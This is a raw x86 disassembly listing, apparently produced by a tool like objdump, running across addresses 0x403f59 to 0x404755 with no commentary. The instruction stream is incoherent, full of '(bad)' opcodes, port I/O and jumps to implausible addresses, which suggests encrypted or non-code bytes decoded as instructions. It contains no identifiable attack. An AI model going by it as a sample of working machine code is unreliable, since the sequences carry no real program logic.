  403f59:	jmp    0x605dc6dd
  403f5e:	ins    BYTE PTR es:[edi],dx
  403f5f:	jns    0x403f90
  403f61:	push   ebx
  403f62:	xchg   DWORD PTR [ecx-0x3c3bc52a],ebx
  403f68:	lock cmp bh,BYTE PTR [edi+0x2f0bd256]
  403f6f:	(bad)  
  403f73:	push   0x38f3265d
  403f78:	pop    ebp
  403f79:	std    
  403f7a:	int3   
  403f7b:	push   0xdd0274a2
  403f80:	sub    bl,dh
  403f82:	or     al,cl
  403f84:	mov    BYTE PTR ds:0xf4108880,ah
  403f8a:	xchg   DWORD PTR [esi+0x7966f70a],edx
  403f90:	(bad)
  403f93:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f95:	out    dx,eax
  403f96:	dec    esp
  403f97:	sub    dl,al
  403f99:	call   0x9d436304
  403f9e:	lea    esp,[ebx+esi*8+0x5d0b9cd1]
  403fa5:	push   ebp
  403fa6:	fiadd  DWORD PTR [edi+0x95fe5bc]
  403fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fad:	out    dx,eax
  403fae:	sub    BYTE PTR [ebp-0x55],ch
  403fb1:	mov    edi,0x17e43213
  403fb6:	xor    eax,DWORD PTR [ebp-0x7d]
  403fb9:	cmp    DWORD PTR [edx],0xffffffd3
  403fbc:	hlt    
  403fbd:	test   BYTE PTR [eax],0x3b
  403fc0:	cdq    
  403fc1:	cld    
  403fc2:	jle    0x404031
  403fc4:	sbb    eax,0xdc532fb8
  403fc9:	adc    eax,0xd82adf43
  403fce:	cmp    ebp,DWORD PTR [ebp+ecx*8-0x640bf1c5]
  403fd5:	push   0x6e92207c
  403fda:	lds    esp,FWORD PTR [edi+eiz*2+0x6c]
  403fde:	es sub al,al
  403fe1:	out    0xcb,eax
  403fe3:	ficom  DWORD PTR [ecx]
  403fe5:	push   es
  403fe6:	mov    WORD PTR [esi-0x3e5e0b59],?
  403fec:	cmp    DWORD PTR [ecx+0x7d],ebx
  403fef:	sub    bh,BYTE PTR [ebx-0x2e885a47]
  403ff5:	cmp    edx,esp
  403ff7:	dec    ecx
  403ff8:	cld    
  403ff9:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ffb:	mov    ?,WORD PTR [edi]
  403ffd:	test   al,0x11
  403fff:	(bad)  [eax-0x5]
  404002:	pop    edi
  404003:	add    eax,0x99c60295
  404008:	cmp    BYTE PTR [esp+ebp*1],dh
  40400b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40400c:	fidivr DWORD PTR [eax]
  40400e:	sbb    dl,BYTE PTR [ecx+eax*2-0x4b]
  404012:	adc    bl,BYTE PTR [ebx+0x10]
  404015:	add    esp,DWORD PTR [esi+0x19bd5bd0]
  40401b:	mov    al,ds:0xd5004407
  404020:	aaa    
  404021:	mov    eax,0x1986ebc6
  404026:	sub    eax,0xd8afce0a
  40402b:	or     eax,0x47bb7ec6
  404030:	mov    dh,0x12
  404032:	mov    cl,0x3
  404034:	mov    edi,0xe9b5c0ee
  404039:	div    esi
  40403b:	xchg   DWORD PTR [esi-0x33],esi
  40403e:	dec    ecx
  40403f:	out    0x47,eax
  404041:	dec    ebx
  404042:	push   edx
  404043:	push   cs
  404044:	stos   DWORD PTR es:[edi],eax
  404045:	scas   eax,DWORD PTR es:[edi]
  404046:	adc    eax,DWORD PTR [ecx-0x2]
  404049:	xchg   esp,eax
  40404a:	jbe    0x404060
  40404c:	xor    bh,dh
  40404e:	loopne 0x40406a
  404050:	push   ebp
  404051:	push   edi
  404052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404053:	or     al,0x90
  404055:	loop   0x40403f
  404057:	push   esp
  404058:	inc    ebx
  404059:	mov    ebp,DWORD PTR [eax-0x44]
  40405c:	fsub   DWORD PTR [edx+0x20]
  40405f:	sbb    DWORD PTR [edi],ecx
  404061:	arpl   WORD PTR [ecx+0x9340eff],si
  404067:	or     al,BYTE PTR [ebx+ebp*8-0x3e2de3ee]
  40406e:	dec    edx
  40406f:	add    DWORD PTR [eax],0x47a6cefe
  404075:	iret   
  404076:	jecxz  0x40409c
  404078:	clc    
  404079:	jns    0x4040d4
  40407b:	imul   eax,esp,0xa
  40407e:	and    DWORD PTR [edi],0x39
  404081:	add    ecx,DWORD PTR [eax]
  404083:	mov    cl,0x3b
  404085:	pop    eax
  404086:	push   edx
  404087:	icebp  
  404088:	jge    0x4040b8
  40408a:	lods   eax,DWORD PTR ds:[esi]
  40408b:	jb     0x4040c2
  40408d:	int    0xcd
  40408f:	mov    eax,0xae1a3579
  404094:	fistp  DWORD PTR ds:0x5c926fc5
  40409a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40409b:	stc    
  40409c:	(bad)  
  40409d:	gs es ret 0x43fc
  4040a2:	push   es
  4040a3:	mov    gs,WORD PTR ds:0xb06208fd
  4040a9:	retf   
  4040aa:	lods   al,BYTE PTR ds:[esi]
  4040ab:	push   esi
  4040ac:	std    
  4040ad:	mov    DWORD PTR [esi-0x45b27023],0x1cb6d9ed
  4040b7:	add    ah,BYTE PTR ds:0x15a76dcc
  4040bd:	push   edi
  4040be:	ins    BYTE PTR es:[edi],dx
  4040bf:	dec    esp
  4040c0:	in     eax,0x98
  4040c2:	loopne 0x4040ed
  4040c4:	dec    ebx
  4040c5:	adc    eax,0x3cd4e1b
  4040ca:	bound  ebp,QWORD PTR [edi+0x67]
  4040cd:	xchg   edx,eax
  4040ce:	mov    eax,ds:0x81724c90
  4040d3:	push   0xcd9eea8a
  4040d8:	out    dx,eax
  4040d9:	pop    DWORD PTR [edx-0x7d]
  4040dc:	and    ch,bh
  4040de:	mov    es,WORD PTR [ebp-0x78de8871]
  4040e4:	xchg   ebp,esi
  4040e6:	push   ss
  4040e7:	sbb    eax,0x4b4f014a
  4040ec:	jle    0x40410f
  4040ee:	jo     0x40410f
  4040f0:	pop    es
  4040f1:	ret    0xae0d
  4040f4:	arpl   WORD PTR [ebp-0x4d],bx
  4040f7:	adc    eax,0x417bf133
  4040fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040fd:	xchg   ecx,eax
  4040fe:	sub    BYTE PTR [ebx+0x38bdd38e],dl
  404104:	mov    dh,0xed
  404106:	call   0x90814ae9
  40410b:	mov    edi,0x7bd728ca
  404110:	popf   
  404111:	inc    eax
  404113:	(bad)  
  404114:	in     al,dx
  404115:	out    0xa1,al
  404117:	nop
  404118:	enter  0xde1d,0x25
  40411c:	cmp    DWORD PTR [edi+ecx*8],edx
  40411f:	jns    0x4040e8
  404121:	test   BYTE PTR ds:0x4aee3f46,ah
  404127:	sbb    DWORD PTR [edi],ecx
  404129:	loope  0x4041a6
  40412b:	xor    ecx,esp
  40412d:	sbb    eax,0x5fc9d967
  404132:	sbb    dh,BYTE PTR [ebx-0x36]
  404135:	lea    edi,[edi]
  404137:	test   BYTE PTR [edx+0x5b],0xcd
  40413b:	stos   DWORD PTR es:[edi],eax
  40413c:	and    cl,cl
  40413e:	int    0xb
  404140:	dec    esp
  404141:	mov    ebp,0xa03ad1d0
  404146:	xor    ch,BYTE PTR [eax-0x5f]
  404149:	pop    ebp
  40414a:	iret   
  40414b:	jle    0x404107
  40414d:	out    0xb8,al
  40414f:	das    
  404150:	push   esp
  404151:	int3   
  404152:	fistp  DWORD PTR [eax]
  404154:	ret    
  404155:	jno    0x4040ef
  404157:	test   ch,al
  404159:	ret    
  40415a:	pusha  
  40415b:	aad    0xa7
  40415d:	mov    ebp,0xb7011cff
  404162:	xor    DWORD PTR [edi+ecx*4-0x75],esi
  404166:	inc    esp
  404167:	scas   al,BYTE PTR es:[edi]
  404168:	std    
  404169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40416a:	(bad)  
  40416c:	clc    
  40416d:	dec    esi
  40416e:	xchg   BYTE PTR [esi*8-0x678ffec8],al
  404175:	or     DWORD PTR [edx+0x6547de36],ebp
  40417b:	mov    ebp,0xaca2c683
  404180:	fnstsw WORD PTR [edx+esi*8-0x204ecdff]
  404187:	or     eax,0xc8395dda
  40418c:	sbb    al,0x2f
  40418e:	and    DWORD PTR [edx-0x239fc7a6],eax
  404194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404195:	gs inc ecx
  404197:	dec    ebx
  404198:	adc    DWORD PTR [ebp+0x3d],ebx
  40419b:	xor    eax,DWORD PTR [eax-0x30b80573]
  4041a1:	push   es
  4041a2:	sahf   
  4041a3:	xor    BYTE PTR fs:[ecx+ebp*8+0x6eae0325],ch
  4041ab:	loop   0x4041fc
  4041ad:	ret    0xd61c
  4041b0:	mov    DWORD PTR [eax-0x26346058],ecx
  4041b6:	ds or  al,0xb3
  4041b9:	imul   edi,DWORD PTR [ecx+edi*8-0x2b89a15b],0x4f693f9a
  4041c4:	sbb    al,0x5
  4041c6:	clc    
  4041c7:	push   ss
  4041c8:	mov    bl,0xad
  4041ca:	xor    ebx,DWORD PTR [edx+0x7d497d21]
  4041d0:	push   edx
  4041d1:	or     edx,esi
  4041d3:	mov    esi,0x3d1dd70e
  4041d8:	sub    ah,cl
  4041da:	pop    esp
  4041db:	stc    
  4041dc:	cmp    ch,BYTE PTR [ebx]
  4041de:	jg     0x4041da
  4041e0:	push   edi
  4041e1:	xor    edi,DWORD PTR [ebx+0x2d]
  4041e4:	lock mov dh,0xa8
  4041e7:	pop    ecx
  4041e8:	test   eax,0xdc01bc14
  4041ed:	fadd   QWORD PTR [edi]
  4041ef:	cmp    ebp,DWORD PTR [edi]
  4041f1:	add    dh,BYTE PTR [ecx-0x34]
  4041f4:	mov    esp,0xaa6d5b9b
  4041f9:	add    ebx,esp
  4041fb:	scas   eax,DWORD PTR es:[edi]
  4041fc:	lods   eax,DWORD PTR ds:[esi]
  4041fd:	add    DWORD PTR [ecx],eax
  4041ff:	push   ds
  404200:	fmul   DWORD PTR [ebp+0x46]
  404203:	mov    ah,0x33
  404205:	in     eax,0x72
  404207:	retf   
  404208:	jb     0x404224
  40420a:	ds es push 0xf2fd8989
  404211:	imul   esp,DWORD PTR [edi-0x6901f96a],0x54049a5
  40421b:	ret    0x7582
  40421e:	push   0x17
  404220:	add    esp,DWORD PTR [ebx-0x23a6880]
  404226:	pop    ebp
  404227:	ins    BYTE PTR es:[edi],dx
  404228:	lock stc 
  40422a:	pop    es
  40422b:	jmp    0x4041e4
  40422d:	stc    
  40422e:	cmp    DWORD PTR [ecx-0x2a3b680c],ebx
  404234:	pop    es
  404235:	fwait
  404236:	cs push edi
  404238:	imul   esp,DWORD PTR [ebp+0x5705c6b4],0xffffffe0
  40423f:	clc    
  404240:	sbb    eax,0xcad61c20
  404245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404246:	add    eax,0xebd35fe2
  40424b:	add    esp,DWORD PTR ds:0x567b4227
  404251:	pop    esp
  404252:	sbb    ebp,ebx
  404254:	jo     0x404234
  404256:	ficomp WORD PTR [edi]
  404258:	sbb    BYTE PTR [ecx],ch
  40425a:	int    0x88
  40425c:	hlt    
  40425d:	sbb    DWORD PTR [eax],edi
  40425f:	xchg   ch,cl
  404261:	fidiv  DWORD PTR [edx]
  404263:	inc    esp
  404264:	pushf  
  404265:	test   DWORD PTR [edi+0x52aba930],edx
  40426b:	loopne 0x40428a
  40426d:	dec    esi
  40426e:	fmul   QWORD PTR [eax+0x68baf04f]
  404274:	sbb    BYTE PTR [ebp-0x31],bl
  404277:	xor    bh,bl
  404279:	fdivp  st(1),st
  40427b:	das    
  40427c:	je     0x4042de
  40427e:	sub    ah,BYTE PTR [edx+0x13]
  404281:	mov    al,ds:0xad307431
  404286:	ins    DWORD PTR es:[edi],dx
  404287:	lahf   
  404288:	xor    BYTE PTR [edx+0x7e],dh
  40428b:	test   eax,0x5769fcda
  404291:	jmp    0x3f484097
  404296:	or     eax,0xcd61eda6
  40429b:	xor    al,BYTE PTR [esi]
  40429d:	and    BYTE PTR [eax+0x53ee31b7],cl
  4042a3:	nop
  4042a4:	xchg   DWORD PTR [eax+0x18],esi
  4042a7:	sub    BYTE PTR [esi-0x50],ah
  4042aa:	sbb    al,0xf1
  4042ac:	push   0xfffffff0
  4042ae:	cmp    DWORD PTR [ecx+0x5],esi
  4042b1:	push   eax
  4042b2:	loop   0x404306
  4042b4:	dec    esp
  4042b5:	mov    ebp,0xe3af6900
  4042ba:	imul   eax,DWORD PTR [edx*4-0x213a0d2a],0xd0f88300
  4042c5:	cmc    
  4042c6:	retfw  
  4042c8:	push   es
  4042c9:	ja     0x4042ea
  4042cb:	fidivr WORD PTR [esi]
  4042cd:	inc    esi
  4042ce:	mov    ds:0xd039518c,eax
  4042d3:	jmp    0x5fd2:0x694a9b21
  4042da:	pop    ecx
  4042db:	cmp    ebp,DWORD PTR [edi-0x96a64e1]
  4042e1:	mov    ebx,0x360138eb
  4042e6:	inc    DWORD PTR [ebx+0x23dcafb2]
  4042ec:	popa   
  4042ed:	sub    BYTE PTR [edi+0x3b],0x96
  4042f1:	lock and esi,DWORD PTR [edi+0x27edaec1]
  4042f8:	lock outs dx,BYTE PTR ds:[esi]
  4042fa:	aam    0x9d
  4042fc:	dec    edx
  4042fd:	int    0x98
  4042ff:	fwait
  404300:	pop    edi
  404301:	imul   esi,DWORD PTR fs:[ebp-0x1d],0x63
  404306:	add    esp,DWORD PTR [esi]
  404308:	add    BYTE PTR [ebp+eax*1-0x8],al
  40430c:	fucomi st,st(5)
  40430e:	push   esi
  40430f:	stos   BYTE PTR es:[edi],al
  404310:	mov    ecx,0x967556ff
  404316:	push   cs
  404317:	imul   ebp,ebp,0xd844107c
  40431d:	jb     0x4042f9
  40431f:	fbld   TBYTE PTR [ebp+0x64]
  404322:	mov    esp,0x115dfe7d
  404327:	push   eax
  404328:	jl     0x404367
  40432a:	jp     0x404390
  40432c:	fiadd  WORD PTR [ecx]
  40432e:	jl     0x404335
  404330:	ds mov al,0x68
  404333:	ficomp DWORD PTR [esi-0x7ceb1431]
  404339:	adc    ecx,ebp
  40433b:	mov    ebp,0xd28c4787
  404340:	jle    0x404311
  404342:	mov    BYTE PTR [esi],bh
  404344:	jmp    DWORD PTR [ebp+0x3c296265]
  40434a:	sar    DWORD PTR [ecx-0x19],cl
  40434d:	xor    esi,DWORD PTR [edx+0x47aef5af]
  404353:	sbb    DWORD PTR [eax+0x13],ecx
  404356:	xchg   ecx,eax
  404357:	xor    BYTE PTR [eax-0x6d3059d6],cl
  40435d:	jmp    0x8415:0x1d8aee9d
  404364:	cld    
  404365:	cmp    BYTE PTR [edx],ch
  404367:	dec    ebp
  404368:	into   
  404369:	xlat   BYTE PTR ds:[ebx]
  40436a:	or     dl,dl
  40436c:	(bad)  [ebx-0x57]
  40436f:	out    0x92,eax
  404371:	pop    es
  404372:	aam    0x3b
  404374:	jo     0x4043f1
  404376:	mov    dl,0x7e
  404378:	sub    ecx,esp
  40437a:	mov    ds:0xc27785dd,eax
  40437f:	xchg   esp,eax
  404380:	and    DWORD PTR [ecx-0x5d580e5d],edi
  404386:	es ja  0x404332
  404389:	sub    eax,0xb9cb2d03
  40438e:	xchg   BYTE PTR [ebp+0x7],al
  404391:	addr16 (bad) 
  404393:	ss je  0x4043b2
  404396:	inc    eax
  404397:	pop    ebx
  404398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404399:	ret    0x7e75
  40439c:	stc    
  40439d:	and    BYTE PTR [edi],cl
  40439f:	dec    esi
  4043a0:	mov    ah,0x7c
  4043a2:	xlat   BYTE PTR ds:[ebx]
  4043a3:	imul   edx,esp,0x1d
  4043a6:	jmp    0x404343
  4043a8:	push   ds
  4043a9:	fidivr WORD PTR [ebx+ebx*1-0x4f]
  4043ad:	outs   dx,DWORD PTR ds:[esi]
  4043ae:	xor    eax,esp
  4043b0:	and    esp,DWORD PTR [ecx]
  4043b2:	jmp    0xb9d5:0xf0e57031
  4043b9:	mov    ds:0xf33c7dad,eax
  4043be:	add    BYTE PTR fs:[ebx],dl
  4043c1:	and    eax,0xde6101e6
  4043c6:	adc    BYTE PTR [ecx],dl
  4043c8:	dec    eax
  4043c9:	xchg   edi,eax
  4043ca:	xchg   DWORD PTR [esi],eax
  4043cc:	into   
  4043cd:	cdq    
  4043ce:	call   ebx
  4043d0:	outs   dx,DWORD PTR ds:[esi]
  4043d1:	out    dx,eax
  4043d2:	jmp    0x3bf:0xcd1ceb4b
  4043d9:	add    DWORD PTR [edi-0x21],ebx
  4043dc:	push   ss
  4043dd:	test   BYTE PTR [esi-0x44db9527],ch
  4043e3:	sbb    al,0xe9
  4043e5:	jge    0x4043d5
  4043e7:	int    0x1b
  4043e9:	mov    es,edx
  4043eb:	mov    eax,ds:0x46138a12
  4043f0:	pushf  
  4043f1:	xor    BYTE PTR [eax-0x5d4a638b],al
  4043f7:	fmul   DWORD PTR [ebx-0x42]
  4043fa:	aad    0xc1
  4043fc:	stc    
  4043fd:	cwde   
  4043fe:	xor    ebx,DWORD PTR [edx+0x49]
  404401:	lock inc edi
  404403:	das    
  404404:	clc    
  404405:	mov    esi,0x78267027
  40440a:	lods   al,BYTE PTR ds:[esi]
  40440b:	xchg   esi,eax
  40440c:	push   0x5d
  40440e:	pushf  
  40440f:	push   esp
  404410:	xchg   edx,eax
  404411:	pop    esp
  404412:	jbe    0x4043f8
  404414:	adc    DWORD PTR [edi+0x10fd3978],0xf5ffca4b
  40441e:	loope  0x4043c2
  404420:	test   eax,0x98deb439
  404425:	mov    DWORD PTR ds:0x525d0e1d,ebp
  40442b:	lock push esi
  40442d:	(bad)  
  40442e:	(bad)  
  40442f:	fistp  DWORD PTR [ecx+0xc]
  404432:	sub    ah,BYTE PTR [ecx]
  404434:	inc    edi
  404435:	or     DWORD PTR [esp+ebx*1],ecx
  404438:	sub    bh,BYTE PTR [esi+ecx*2-0xa]
  40443c:	(bad)  
  40443d:	jbe    0x4044ac
  40443f:	(bad)  
  404441:	icebp  
  404442:	and    dl,al
  404444:	in     al,dx
  404445:	fst    DWORD PTR [eax]
  404447:	add    al,0x41
  404449:	sbb    al,0x2a
  40444b:	das    
  40444c:	mov    ds:0x1b9ab768,al
  404451:	icebp  
  404452:	lods   al,BYTE PTR ds:[esi]
  404453:	push   0xffffff98
  404455:	mov    eax,DWORD PTR [eax]
  404457:	ror    BYTE PTR [eax],1
  404459:	mov    ds:0xf94b2827,eax
  40445e:	jg     0x40442e
  404460:	bound  edi,QWORD PTR [eax+0xc]
  404463:	mov    bh,0x13
  404465:	mov    ds:0x74b922c5,eax
  40446a:	pusha  
  40446b:	outs   dx,BYTE PTR ds:[esi]
  40446c:	xchg   esp,eax
  40446d:	xor    al,0x5d
  40446f:	inc    esp
  404470:	pushf  
  404471:	sub    BYTE PTR [ecx],ah
  404473:	xor    eax,0x6fd97826
  404478:	std    
  404479:	xor    edx,0xe
  40447c:	retf   0x23a4
  40447f:	fwait
  404480:	mov    cl,0xc3
  404482:	call   0xf9ef:0x3876350a
  404489:	mov    ds:0x84315973,eax
  40448e:	and    al,0x13
  404490:	mov    cl,0xe5
  404492:	out    dx,eax
  404493:	mov    ch,BYTE PTR [ebx]
  404495:	cmp    al,0x6a
  404497:	or     edi,esi
  404499:	arpl   WORD PTR [esi+0xc],bx
  40449c:	jge    0x404499
  40449e:	mov    WORD PTR [esi-0x4e],ds
  4044a1:	and    edx,DWORD PTR [edi+0x3c1bf976]
  4044a7:	daa    
  4044a8:	cmp    DWORD PTR [ebp+esi*4-0x46],eax
  4044ac:	ja     0x4044dd
  4044ae:	leave  
  4044af:	stos   DWORD PTR es:[edi],eax
  4044b0:	mov    edi,DWORD PTR [eax+eiz*1]
  4044b3:	push   esi
  4044b4:	sbb    ebx,DWORD PTR [edx+0x21]
  4044b7:	adc    DWORD PTR [esi],ecx
  4044b9:	gs stos BYTE PTR es:[edi],al
  4044bb:	int3   
  4044bc:	mov    ecx,0x72a72ead
  4044c1:	or     ch,BYTE PTR [ecx-0x80]
  4044c4:	scas   al,BYTE PTR es:[edi]
  4044c5:	lds    ebx,FWORD PTR [esi+0x6e]
  4044c8:	ds aad 0x81
  4044cb:	leave  
  4044cc:	push   eax
  4044cd:	push   0x2bcaa89e
  4044d2:	fisttp DWORD PTR [esp+ebp*4]
  4044d5:	cmp    cl,BYTE PTR [ebx-0x70]
  4044d8:	push   ds
  4044d9:	add    esi,DWORD PTR [edx+0x62]
  4044dc:	and    ah,cl
  4044de:	mov    ch,0xd
  4044e0:	aad    0xde
  4044e2:	sbb    dh,BYTE PTR [ebx-0x7b2f408a]
  4044e8:	and    dh,BYTE PTR [ebp-0x14]
  4044eb:	sbb    esp,DWORD PTR [edi]
  4044ed:	mov    dl,0x8
  4044ef:	fstp   DWORD PTR [esp+esi*8+0x6c18ae26]
  4044f6:	jnp    0x40447b
  4044f8:	add    al,0x21
  4044fa:	je     0x404520
  4044fc:	outs   dx,DWORD PTR ds:[esi]
  4044fd:	jge    0x4044bb
  4044ff:	rcl    bl,cl
  404501:	sahf   
  404502:	outs   dx,BYTE PTR ds:[esi]
  404503:	fst    QWORD PTR [esi+0x5e]
  404506:	mov    DWORD PTR [esi],ecx
  404508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404509:	popa   
  40450a:	mov    ds:0xcccac8e8,eax
  40450f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404510:	mov    ch,BYTE PTR [ebx]
  404512:	push   0xffffffe6
  404514:	retf   
  404515:	or     cl,dl
  404517:	leave  
  404518:	sub    al,0x17
  40451a:	retf   
  40451b:	inc    esp
  40451c:	adc    al,BYTE PTR [esi+0x6afef40d]
  404522:	lock loop 0x404520
  404525:	test   eax,0xaf7b122
  40452a:	lds    ebp,FWORD PTR [ebx+0x66bf5cc]
  404530:	jecxz  0x40459f
  404532:	into   
  404533:	xchg   ecx,eax
  404534:	mov    BYTE PTR [eax+ecx*2+0x4ef89039],0x48
  40453c:	mov    ebx,eax
  40453e:	ror    DWORD PTR [ebp-0x4bf05654],0x50
  404545:	mov    bh,0x39
  404547:	jno    0x4045ac
  404549:	jmp    0xf2c2f89a
  40454e:	stos   BYTE PTR es:[edi],al
  40454f:	or     ah,BYTE PTR [edx-0x3c]
  404552:	test   ch,ch
  404554:	je     0x404524
  404556:	repnz xlat BYTE PTR ds:[ebx]
  404558:	mov    edx,0x31ee9f1c
  40455d:	sbb    BYTE PTR [esi-0x28],dh
  404560:	sub    DWORD PTR [esi+0x52c2e840],ebp
  404566:	adc    al,0xa6
  404568:	and    eax,0x3802591
  40456d:	jne    0x40459d
  40456f:	repz mov ds:0x1f60c27c,al
  404575:	sbb    al,0x5e
  404577:	mov    cl,0xd
  404579:	jmp    0x40452e
  40457b:	imul   esp,DWORD PTR [ebp+0x6b],0xfffffffd
  40457f:	jmp    0x4045dd
  404581:	jne    0x40450b
  404583:	jnp    0x4045d5
  404585:	push   ebx
  404586:	jmp    0xf8f66c58
  40458b:	jg     0x404580
  40458d:	in     eax,0xb8
  40458f:	inc    eax
  404590:	xchg   BYTE PTR [esi-0xc9cd2e4],ah
  404596:	stos   BYTE PTR es:[edi],al
  404597:	stc    
  404598:	jge    0x404592
  40459a:	scas   eax,DWORD PTR es:[edi]
  40459b:	jecxz  0x404565
  40459d:	xchg   esi,eax
  40459e:	retf   
  40459f:	inc    esp
  4045a0:	pop    ebp
  4045a1:	scas   al,BYTE PTR es:[edi]
  4045a2:	pop    es
  4045a3:	xchg   ebp,eax
  4045a4:	jmp    0x16c69a97
  4045a9:	inc    ecx
  4045aa:	int    0x28
  4045ac:	adc    cl,BYTE PTR [ecx-0x1]
  4045af:	ja     0x4045ec
  4045b1:	(bad)  
  4045b2:	fnstsw WORD PTR [ebx+0x5f6299e0]
  4045b8:	ret    
  4045b9:	jo     0x404617
  4045bb:	or     ebp,DWORD PTR [edx-0x22bd94d7]
  4045c1:	push   eax
  4045c2:	frstor [ebp-0x297f0072]
  4045c8:	jg     0x404615
  4045ca:	cmp    BYTE PTR [ecx+ecx*4+0x12687433],dl
  4045d1:	xchg   esi,eax
  4045d2:	aad    0x50
  4045d4:	mov    edx,0xa31b8e67
  4045d9:	js     0x404574
  4045db:	mov    dh,0xcc
  4045dd:	test   al,0xb1
  4045df:	imul   edx,DWORD PTR [ebx+0x592e1f52],0xe3842452
  4045e9:	dec    edi
  4045ea:	mov    edx,0xb6086d7c
  4045ef:	pushf  
  4045f0:	daa    
  4045f1:	fidiv  WORD PTR [edi+0x12]
  4045f4:	nop
  4045f5:	pop    esp
  4045f6:	retf   0xcd25
  4045f9:	into   
  4045fa:	pop    ss
  4045fb:	sub    BYTE PTR [ebp+edi*8-0x75],al
  4045ff:	mov    esi,0xf15e9161
  404604:	imul   bh
  404606:	pop    esi
  404607:	lods   eax,DWORD PTR ds:[esi]
  404608:	push   ecx
  404609:	xchg   edx,eax
  40460a:	fadd   st(6),st
  40460c:	xchg   esi,eax
  40460d:	pop    ebx
  40460e:	lods   eax,DWORD PTR ds:[esi]
  404610:	fadd   DWORD PTR [eax+0x300ad7d7]
  404616:	jns    0x404676
  404618:	cmp    al,0x43
  40461a:	(bad)  
  40461c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40461d:	pop    ecx
  40461e:	jne    0x404697
  404620:	push   ds
  404621:	ret    
  404622:	jnp    0x404625
  404624:	scas   al,BYTE PTR es:[edi]
  404625:	cmp    al,0x4c
  404627:	mov    edx,DWORD PTR [ecx]
  404629:	xchg   edx,eax
  40462a:	mov    bl,0xaa
  40462c:	cwde   
  40462d:	push   esp
  40462e:	test   DWORD PTR [eax],0xc87da6ce
  404634:	mov    eax,esp
  404636:	mov    ecx,0x14ff73a2
  40463b:	mov    edx,0x6a589090
  404640:	retf   
  404641:	xor    esp,esi
  404643:	push   cs
  404644:	repz xchg ecx,eax
  404646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404647:	rcr    DWORD PTR [ecx-0x7c],1
  40464a:	cld    
  40464b:	(bad)  
  40464d:	add    DWORD PTR [ebp-0x28e08e63],eax
  404653:	aad    0xa3
  404655:	xchg   ebx,eax
  404656:	and    ch,BYTE PTR ds:0x9ddc7dfe
  40465c:	fist   WORD PTR [ecx-0x320cac18]
  404662:	test   al,0x81
  404664:	dec    ebp
  404665:	jnp    0x40463a
  404667:	iret   
  404668:	jge    0x404697
  40466a:	lea    esi,[edi]
  40466c:	jne    0x404612
  40466e:	cmp    dh,BYTE PTR [ebx]
  404670:	arpl   WORD PTR [esi],di
  404672:	pop    ds
  404673:	adc    esp,DWORD PTR [ebp-0x54]
  404676:	(bad)  
  404677:	mov    ds:0xff8621dc,eax
  40467c:	pop    esp
  40467d:	daa    
  40467e:	dec    ebx
  40467f:	mov    esi,0xf709eac8
  404684:	sar    BYTE PTR [ecx+ecx*1+0x4fc30cac],1
  40468b:	dec    ebp
  40468c:	jb     0x404635
  40468e:	shr    DWORD PTR [eax-0x48],0x9e
  404692:	in     eax,dx
  404693:	lods   eax,DWORD PTR ds:[esi]
  404694:	mov    al,0x5e
  404696:	ins    DWORD PTR es:[edi],dx
  404697:	popf   
  404698:	mov    DWORD PTR [edx],ebp
  40469a:	sbb    eax,0xb7391a4c
  40469f:	int3   
  4046a0:	xchg   esp,eax
  4046a1:	jp     0x4046eb
  4046a3:	fimul  DWORD PTR [ecx]
  4046a5:	pushf  
  4046a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a7:	pushf  
  4046a8:	mov    eax,ds:0xfe3551ae
  4046ad:	frstor [edx+ebx*4]
  4046b0:	adc    eax,0x77fe7970
  4046b5:	adc    eax,0xc4ae1f98
  4046ba:	sbb    DWORD PTR [esi-0x24],edx
  4046bd:	ficomp WORD PTR [eax]
  4046bf:	cli    
  4046c0:	test   DWORD PTR [ebx],eax
  4046c2:	(bad)  
  4046c3:	dec    edi
  4046c4:	jnp    0x4046ac
  4046c6:	call   0x793b6ec0
  4046cb:	xor    esp,DWORD PTR [ecx+ebp*8-0x20a1d086]
  4046d2:	mov    ecx,0x50b5ab43
  4046d7:	ror    DWORD PTR [ebp+0x2a1bb7b9],0xd7
  4046de:	in     al,0x1e
  4046e0:	popa   
  4046e1:	or     DWORD PTR [ecx+eiz*1+0x0],ecx
  4046e5:	dec    esi
  4046e6:	mov    ah,0x55
  4046e8:	ins    DWORD PTR es:[edi],dx
  4046e9:	and    ebx,ebx
  4046eb:	test   BYTE PTR [eax],0x8
  4046ee:	push   0x6334cfac
  4046f3:	mov    ds:0x6c2627c0,al
  4046f8:	add    esi,esp
  4046fa:	rol    DWORD PTR [esi-0x7a],cl
  4046fd:	pop    ebp
  4046fe:	fwait
  4046ff:	je     0x404688
  404701:	push   0xffffff86
  404703:	stos   BYTE PTR es:[edi],al
  404704:	(bad)  
  404705:	sar    BYTE PTR [eax-0x75c8b763],cl
  40470b:	clc    
  40470c:	jecxz  0x404714
  40470e:	rcr    DWORD PTR [edi+0x66],1
  404711:	pop    edx
  404712:	and    eax,0x15556a33
  404717:	xor    eax,0x8019d3e5
  40471c:	push   esp
  40471d:	retf   
  40471e:	ret    0x11e5
  404721:	mov    ds:0xe91717e3,al
  404726:	and    al,0xe7
  404728:	mov    eax,ds:0x8270838e
  40472d:	sbb    DWORD PTR [eax+edi*8],esp
  404730:	cmp    al,0x41
  404732:	and    eax,0xc260ea81
  404737:	xor    DWORD PTR [ecx-0x79743772],0x315da0fd
  404741:	sbb    edx,ebp
  404743:	xor    DWORD PTR [eax-0x71],ebp
  404746:	cmp    al,0xa9
  404748:	bnd jno 0x404768
  40474b:	push   cs
  40474c:	shl    DWORD PTR [edx+eax*2],1
  40474f:	idiv   BYTE PTR [ebp+0x2253f79c]
  404755:	inc    ebx
